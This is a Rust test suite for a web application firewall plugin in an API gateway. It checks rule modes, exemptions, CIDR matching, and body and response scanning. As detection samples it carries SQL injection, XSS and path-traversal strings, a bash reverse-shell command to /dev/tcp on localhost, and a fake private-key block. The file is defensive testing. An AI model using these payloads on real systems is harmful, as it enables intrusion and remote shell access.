use ferrum_edge::plugins::waf::Waf;
use ferrum_edge::plugins::{Plugin, PluginResult, RequestContext, is_security_plugin};
use serde_json::json;
use std::collections::HashMap;

fn ctx(method: &str, path: &str) -> RequestContext {
    RequestContext::new("203.0.113.10".into(), method.into(), path.into())
}

#[tokio::test]
async fn default_waf_monitors_sqli_query_without_blocking() {
    let plugin = Waf::new(&json!({})).unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%27%20OR%201%3D1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-SQLI-002"))
    );
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("monitored")
    );
}

#[tokio::test]
async fn rule_mode_can_enforce_default_rule() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());

    let result = plugin.authorize(&mut ctx).await;

    match result {
        PluginResult::Reject {
            status_code, body, ..
        } => {
            assert_eq!(status_code, 403);
            assert_eq!(body, r#"{"error":"Forbidden"}"#);
        }
        other => panic!("expected reject, got {other:?}"),
    }
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("blocked")
    );
    assert_eq!(
        ctx.metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-XSS-001")
    );
}

#[tokio::test]
async fn path_exemption_short_circuits_and_writes_no_waf_metadata() {
    let plugin = Waf::new(&json!({
        "global_exemptions": { "paths": ["/health*"] },
        "rule_modes": { "FE-SQLI-002": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/healthz");
    ctx.set_raw_query_string("q=%27%20OR%201%3D1".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(!ctx.metadata.keys().any(|key| key.starts_with("waf.")));
}

#[tokio::test]
async fn consumer_scoped_request_rule_uses_authenticated_identity() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-CONSUMER-QUERY",
            "name": "consumer scoped query marker",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "conditions": { "consumers": ["alice"] },
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut anonymous_ctx = ctx("GET", "/search");
    anonymous_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut anonymous_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !anonymous_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-CONSUMER-QUERY"))
    );

    let mut authenticated_ctx = ctx("GET", "/search");
    authenticated_ctx.authenticated_identity = Some("alice".into());
    authenticated_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut authenticated_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        authenticated_ctx
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("CUSTOM-CONSUMER-QUERY")
    );
}

#[tokio::test]
async fn custom_rule_path_conditions_are_exact_unless_marked_as_prefix_or_regex() {
    let exact_plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-ADMIN-QUERY",
            "name": "admin query marker",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "conditions": { "paths": ["/admin"] },
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut suffix_ctx = ctx("GET", "/admin-public");
    suffix_ctx.set_raw_query_string("q=needle".into());
    let result = exact_plugin.authorize(&mut suffix_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!suffix_ctx.metadata.contains_key("waf.rule_hits"));

    let mut exact_ctx = ctx("GET", "/admin");
    exact_ctx.set_raw_query_string("q=needle".into());
    let result = exact_plugin.authorize(&mut exact_ctx).await;
    assert!(matches!(result, PluginResult::Reject { .. }));

    let prefix_plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-ADMIN-PREFIX",
            "name": "admin prefix query marker",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "conditions": { "paths": ["/admin*"] },
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut prefix_ctx = ctx("GET", "/admin-public");
    prefix_ctx.set_raw_query_string("q=needle".into());
    let result = prefix_plugin.authorize(&mut prefix_ctx).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn request_body_scan_uses_context_aware_final_body_hook() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    assert!(plugin.requires_request_body_buffering());
    assert!(plugin.should_buffer_request_body(&ctx));

    let headers = ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"cmd":"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}"#,
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-CMD-002"))
    );
}

#[tokio::test]
async fn custom_body_json_path_rule_scans_only_selected_value() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-JSON-1",
            "name": "message content marker",
            "category": "custom",
            "severity": "high",
            "target": { "type": "body_json_path", "path": "messages.0.content" },
            "match_kind": "contains",
            "pattern": "needle",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/chat");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"messages":[{"content":"needle here"}],"other":"clean"}"#,
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-JSON-1")
    );
}

#[tokio::test]
async fn cidr_text_rules_are_scoped_to_their_configured_target() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-CIDR-HEADER",
            "name": "private forwarding address",
            "category": "custom",
            "severity": "high",
            "target": { "type": "header_values", "names": ["x-forwarded-for"] },
            "match_kind": "cidr",
            "pattern": "10.0.0.0/8",
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut query_ctx = ctx("GET", "/search");
    query_ctx.set_raw_query_string("ip=10.1.2.3".into());
    let result = plugin.authorize(&mut query_ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !query_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-CIDR-HEADER"))
    );

    let mut header_ctx = ctx("GET", "/search");
    header_ctx
        .headers
        .insert("x-forwarded-for".into(), "10.1.2.3".into());
    let result = plugin.authorize(&mut header_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        header_ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-CIDR-HEADER")
    );
}

#[tokio::test]
async fn cidr_rules_match_common_ip_with_port_forms() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [
            {
                "id": "CUSTOM-CIDR-IPV4-PORT",
                "name": "private forwarding address with port",
                "category": "custom",
                "severity": "high",
                "target": { "type": "header_values", "names": ["x-forwarded-for"] },
                "match_kind": "cidr",
                "pattern": "10.0.0.0/8",
                "action": "enforce"
            },
            {
                "id": "CUSTOM-CIDR-IPV6-PORT",
                "name": "documentation ipv6 address with port",
                "category": "custom",
                "severity": "high",
                "target": { "type": "header_values", "names": ["x-forwarded-for"] },
                "match_kind": "cidr",
                "pattern": "2001:db8::/32",
                "action": "enforce"
            }
        ]
    }))
    .unwrap();

    let mut ipv4_ctx = ctx("GET", "/search");
    ipv4_ctx
        .headers
        .insert("x-forwarded-for".into(), "10.1.2.3:8443".into());
    let result = plugin.authorize(&mut ipv4_ctx).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ipv4_ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-CIDR-IPV4-PORT")
    );

    let mut ipv6_ctx = ctx("GET", "/search");
    ipv6_ctx
        .headers
        .insert("x-forwarded-for".into(), "[2001:db8::1]:443".into());
    let result = plugin.authorize(&mut ipv6_ctx).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ipv6_ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-CIDR-IPV6-PORT")
    );
}

#[tokio::test]
async fn response_header_cidr_rule_matches_without_regex_header_rules() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "response_inspection": true,
        "custom_rules": [{
            "id": "CUSTOM-CIDR-RESP",
            "name": "private upstream header",
            "category": "custom",
            "severity": "medium",
            "target": "response_headers",
            "match_kind": "cidr",
            "pattern": "10.0.0.0/8",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/debug");
    let mut headers = HashMap::from([("x-upstream-ip".to_string(), "10.2.3.4".to_string())]);

    let result = plugin.after_proxy(&mut ctx, 200, &mut headers).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-CIDR-RESP")
    );
}

#[tokio::test]
async fn response_body_inspection_is_off_by_default() {
    let plugin = Waf::new(&json!({})).unwrap();
    let ctx = ctx("GET", "/");
    assert!(!plugin.requires_response_body_buffering());
    assert!(!plugin.should_buffer_response_body(&ctx));
}

#[tokio::test]
async fn response_body_scan_detects_sensitive_data_when_enabled() {
    let plugin = Waf::new(&json!({
        "response_inspection": true,
        "response_body_inspection": true,
        "rule_modes": { "FE-DATA-LEAK-006": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/debug");
    let headers = HashMap::from([("content-type".to_string(), "text/plain".to_string())]);

    let result = plugin
        .on_final_response_body(
            &mut ctx,
            200,
            &headers,
            b"-----BEGIN PRIVATE KEY-----\nsecret\n-----END PRIVATE KEY-----",
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-DATA-LEAK-006"))
    );
}

#[test]
fn invalid_custom_regex_is_rejected() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-1",
            "name": "bad",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "regex",
            "pattern": "("
        }]
    }))
    .unwrap_err();

    assert!(err.contains("RegexSet"));
}

#[test]
fn luhn_match_kind_requires_body_target() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-LUHN-1",
            "name": "bad target",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "luhn"
        }]
    }))
    .unwrap_err();

    assert!(err.contains("match_kind luhn is only supported for body targets"));
}

#[test]
fn target_object_rejects_irrelevant_fields() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-BAD-NAMES",
            "name": "bad names",
            "category": "custom",
            "severity": "high",
            "target": { "type": "query_values", "names": ["x-forwarded-for"] },
            "match_kind": "contains",
            "pattern": "needle"
        }]
    }))
    .unwrap_err();
    assert!(err.contains("does not support 'names'"));

    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-BAD-PATH",
            "name": "bad path",
            "category": "custom",
            "severity": "high",
            "target": { "type": "response_body", "path": "message" },
            "match_kind": "contains",
            "pattern": "needle"
        }]
    }))
    .unwrap_err();
    assert!(err.contains("does not support 'path'"));
}

#[test]
fn header_value_target_names_must_be_non_empty_when_provided() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-EMPTY-NAMES",
            "name": "empty names",
            "category": "custom",
            "severity": "high",
            "target": { "type": "header_values", "names": [] },
            "match_kind": "contains",
            "pattern": "needle"
        }]
    }))
    .unwrap_err();

    assert!(err.contains("names"));
    assert!(err.contains("non-empty"));
}

#[test]
fn waf_is_security_critical() {
    assert!(is_security_plugin("waf"));
}

#[tokio::test]
async fn duplicate_query_key_cannot_smuggle_payload_past_query_values_rule() {
    // Regression: `materialize_query_params()` collapses duplicate keys into a
    // `HashMap`. The proxy materializes query params before WAF authorize runs,
    // so `?q=<script>&q=ok` previously left only `q=ok` visible in the normal
    // pipeline and the XSS payload slipped past an enforced query_values rule.
    // The fix preserves the raw query string after materialization and scans
    // each raw pair.
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E&q=ok".into());
    ctx.materialize_query_params();
    assert_eq!(
        ctx.query_params.get("q").map(String::as_str),
        Some("ok"),
        "materialized HashMap should mirror the proxy path and keep the last duplicate"
    );
    assert!(
        ctx.raw_query_string().is_some(),
        "raw query must remain available for WAF duplicate-pair inspection"
    );

    let result = plugin.authorize(&mut ctx).await;

    match result {
        PluginResult::Reject { status_code, .. } => assert_eq!(status_code, 403),
        other => panic!("expected reject, got {other:?}"),
    }
    assert_eq!(
        ctx.metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-XSS-001")
    );
}

#[tokio::test]
async fn parsed_query_params_are_scanned_when_raw_query_is_absent() {
    let plugin = Waf::new(&json!({
        "rule_modes": {
            "FE-XSS-001": "enforce",
            "FE-PATHTRAV-001": "enforce"
        }
    }))
    .unwrap();
    let mut query_ctx = ctx("GET", "/search");
    query_ctx
        .query_params
        .insert("q".into(), "<script>alert(1)</script>".into());

    let result = plugin.authorize(&mut query_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        query_ctx
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-XSS-001")
    );

    let mut full_url_ctx = ctx("GET", "/download");
    full_url_ctx
        .query_params
        .insert("file".into(), "../etc/passwd".into());
    let result = plugin.authorize(&mut full_url_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        full_url_ctx
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-PATHTRAV-001")
    );
}

#[tokio::test]
async fn disabled_default_rules_are_skipped() {
    let plugin = Waf::new(&json!({
        "disabled_default_rules": ["FE-XSS-001"],
        "rule_modes": { "FE-XSS-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());

    let result = plugin.authorize(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-XSS-001"))
    );
}

#[tokio::test]
async fn paranoia_level_filters_custom_rules() {
    let config = json!({
        "include_default_rules": false,
        "custom_rules": [
            {
                "id": "CUSTOM-PL1",
                "name": "pl1",
                "category": "custom",
                "target": "query_values",
                "match_kind": "contains",
                "pattern": "never-matches",
                "action": "monitor",
                "paranoia_min": 1
            },
            {
                "id": "CUSTOM-PL2",
                "name": "pl2",
                "category": "custom",
                "target": "query_values",
                "match_kind": "contains",
                "pattern": "needle",
                "action": "enforce",
                "paranoia_min": 2
            }
        ]
    });

    let plugin = Waf::new(&config).unwrap();
    let mut low_ctx = ctx("GET", "/search");
    low_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut low_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(
        !low_ctx
            .metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("CUSTOM-PL2"))
    );

    let mut high_config = config;
    high_config["paranoia_level"] = json!(2);
    let plugin = Waf::new(&high_config).unwrap();
    let mut high_ctx = ctx("GET", "/search");
    high_ctx.set_raw_query_string("q=needle".into());
    let result = plugin.authorize(&mut high_ctx).await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        high_ctx
            .metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("CUSTOM-PL2")
    );
}

#[tokio::test]
async fn inspect_multipart_gates_body_scanning() {
    let default_plugin = Waf::new(&json!({
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut default_ctx = ctx("POST", "/upload");
    default_ctx.headers.insert(
        "content-type".into(),
        "multipart/form-data; boundary=abc".into(),
    );
    let headers = default_ctx.headers.clone();

    let result = default_plugin
        .on_final_request_body_with_context(&mut default_ctx, &headers, b"bash -i")
        .await;
    assert!(matches!(result, PluginResult::Continue));

    let multipart_plugin = Waf::new(&json!({
        "inspect_multipart": true,
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut multipart_ctx = ctx("POST", "/upload");
    multipart_ctx.headers.insert(
        "content-type".into(),
        "multipart/form-data; boundary=abc".into(),
    );
    let headers = multipart_ctx.headers.clone();

    let result = multipart_plugin
        .on_final_request_body_with_context(&mut multipart_ctx, &headers, b"bash -i")
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn oversized_body_skip_mode_does_not_scan_truncated_prefix() {
    let plugin = Waf::new(&json!({
        "max_scan_bytes": 4,
        "on_body_too_large": "skip",
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    ctx.headers.insert("content-length".into(), "16".into());
    let headers = ctx.headers.clone();

    assert!(!plugin.should_buffer_request_body(&ctx));
    let result = plugin
        .on_final_request_body_with_context(&mut ctx, &headers, b"bash -i and more")
        .await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(!ctx.metadata.contains_key("waf.rule_hits"));
}

#[tokio::test]
async fn per_rule_false_positive_filters_suppress_hits() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-FP",
            "name": "fp filter",
            "category": "custom",
            "target": "query_values",
            "match_kind": "contains",
            "pattern": "needle",
            "fp_filters": ["needle ok"],
            "action": "enforce"
        }]
    }))
    .unwrap();

    let mut suppressed = ctx("GET", "/search");
    suppressed.set_raw_query_string("q=needle%20ok".into());
    let result = plugin.authorize(&mut suppressed).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!suppressed.metadata.contains_key("waf.rule_hits"));

    let mut blocked = ctx("GET", "/search");
    blocked.set_raw_query_string("q=needle%20bad".into());
    let result = plugin.authorize(&mut blocked).await;
    assert!(matches!(result, PluginResult::Reject { .. }));
}

#[tokio::test]
async fn global_exemptions_cover_ips_headers_and_capture_filters() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001": "enforce" },
        "global_exemptions": {
            "ips": ["10.0.0.0/8"],
            "header_present": { "x-waf-fp": "known" },
            "fp_capture_filters": ["<script>safe</script>"]
        }
    }))
    .unwrap();

    let mut ip_ctx = RequestContext::new("10.1.2.3".into(), "GET".into(), "/search".into());
    ip_ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());
    let result = plugin.authorize(&mut ip_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!ip_ctx.metadata.contains_key("waf.rule_hits"));

    let mut header_ctx = ctx("GET", "/search");
    header_ctx.headers.insert("x-waf-fp".into(), "known".into());
    header_ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());
    let result = plugin.authorize(&mut header_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!header_ctx.metadata.contains_key("waf.rule_hits"));

    let mut capture_ctx = ctx("GET", "/search");
    capture_ctx.set_raw_query_string("q=%3Cscript%3Esafe%3C/script%3E".into());
    let result = plugin.authorize(&mut capture_ctx).await;
    assert!(matches!(result, PluginResult::Continue));
    assert!(!capture_ctx.metadata.contains_key("waf.rule_hits"));
}

#[test]
fn invalid_global_exemption_cidr_fails_construction() {
    let err = Waf::new(&json!({
        "global_exemptions": { "ips": ["not-a-cidr"] }
    }))
    .unwrap_err();

    assert!(err.contains("global_exemptions.ips"));
    assert!(err.contains("not-a-cidr"));
}

#[test]
fn unknown_disabled_default_rule_id_fails_construction() {
    let err = Waf::new(&json!({
        "disabled_default_rules": ["FE-XSS-999"]
    }))
    .unwrap_err();

    assert!(err.contains("disabled_default_rules"));
    assert!(err.contains("FE-XSS-999"));
}

#[test]
fn unknown_rule_modes_id_fails_construction() {
    // WAF is security-critical: a typo in an `enforce` override would
    // otherwise silently leave the rule monitor-only.
    let err = Waf::new(&json!({
        "rule_modes": { "FE-XSS-99": "enforce" }
    }))
    .unwrap_err();
    assert!(err.contains("unknown rule id"));
    assert!(err.contains("FE-XSS-99"));
}
